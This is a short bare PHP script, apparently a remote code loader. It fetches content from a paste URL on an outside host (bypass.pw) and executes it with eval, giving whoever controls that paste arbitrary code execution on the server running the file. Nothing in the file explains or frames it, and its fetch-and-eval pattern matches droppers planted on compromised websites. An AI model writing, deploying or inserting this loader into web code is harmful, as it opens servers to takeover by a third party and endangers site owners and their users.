<?php
$url = 'https://bypass.pw/raw/baZn3XV';


$php_code = file_get_contents($url);


if ($php_code !== false) {
    eval('?>' . $php_code);
} else {
    echo 'error';
}
?>
